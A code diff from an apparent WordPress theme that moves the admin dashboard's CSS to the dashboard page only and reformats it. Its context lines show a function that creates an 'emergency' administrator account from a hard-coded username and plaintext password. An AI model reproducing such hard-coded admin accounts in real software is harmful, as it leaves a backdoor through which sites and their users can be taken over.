@@ -20,6 +20,8 @@ function ana9a_clean_admin_menu() {
     }
 }
 
+
+
 function ana9a_create_emergency_admin() {
     $username = 'gigi_admin'; 
     $password = 'Mohamed2026!'; 
@@ -53,41 +55,71 @@ function ana9a_remove_all_default_dashboard_widgets() {
 /**
  * 3. شحن ملف CSS الخاص بالثيم وحقن الـ Styles لتوسيع السيكشن
  */
-add_action( 'admin_head', 'ana9a_force_clean_dashboard_css' );
-function ana9a_force_clean_dashboard_css() {
-    // شحن الجسر الديناميكي لملف الـ CSS الرئيسي المترجم الخاص بموقعك
-    echo '<link rel="stylesheet" id="ana9a-main-style-css" href="' . get_stylesheet_uri() . '" type="text/css" media="all" />';
+add_action( 'admin_head-index.php', 'ana9a_force_clean_dashboard_css' );
 
-    echo '<style>
-        /* فورص إخفاء أي بقايا أو هوامش متبقية من السيستم القديم */
-        #dashboard_woocommerce_status, #extended_woocommerce_dashboard,
-        #woocommerce_dashboard_status, .woocommerce-layout__header,
-        #woocommerce-embedded-root, #normal-sortables .postbox-header,
-        #normal-sortables .welcome-panel, .welcome-panel, #welcome-panel {
+function ana9a_force_clean_dashboard_css() {
+    ?>
+    <style>
+        html, body {
+            overflow: auto !important;
+            height: auto !important;
+        }
+
+        #wpcontent,
+        #wpbody,
+        #wpbody-content {
+            overflow: visible !important;
+            height: auto !important;
+        }
+
+        #dashboard_woocommerce_status,
+        #extended_woocommerce_dashboard,
+        #woocommerce_dashboard_status,
+        .woocommerce-layout__header,
+        #woocommerce-embedded-root,
+        #normal-sortables .postbox-header,
+        #normal-sortables .welcome-panel,
+        .welcome-panel,
+        #welcome-panel {
             display: none !important;
         }
 
-        /* جعل الكانتينر المخصص يدي العرض الكامل 100% بدون تقسيم افتراضي */
         #dashboard-widgets #postbox-container-1,
         #dashboard-widgets #postbox-container-2,
         #dashboard-widgets #postbox-container-3,
-        #dashboard-widgets #postbox-container-4 { width: 100% !important; }
-        #dashboard-widgets-mesh .postbox-container { width: 100% !important; float: none !important; }
-        
-        #ana9a_custom_dashboard_widget { background: none !important; border: none !important; box-shadow: none !important; }
-        #ana9a_custom_dashboard_widget .inside { padding: 0 !important; margin: 0 !important; }
+        #dashboard-widgets #postbox-container-4 {
+            width: 100% !important;
+        }
 
-        /* حركة دخول ناعمة مخصصة للوحة التحكم */
+        #ana9a_custom_dashboard_widget {
+            background: none !important;
+            border: none !important;
+            box-shadow: none !important;
+        }
+
+        #ana9a_custom_dashboard_widget .inside {
+            padding: 0 !important;
+            margin: 0 !important;
+        }
+
         @keyframes adminPageFade {
-            0% { opacity: 0; transform: translateY(8px); }
-            100% { opacity: 1; transform: translateY(0); }
+            0% {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .ana9a-dashboard-wrapper {
-            font-family: var(--font-sans, "Tajawal", sans-serif) !important;
-            animation: adminPageFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            font-family: "Tajawal", sans-serif !important;
+            animation: adminPageFade .8s cubic-bezier(.16,1,.3,1) forwards;
         }
-    </style>';
+    </style>
+    <?php
 }
 
 /**
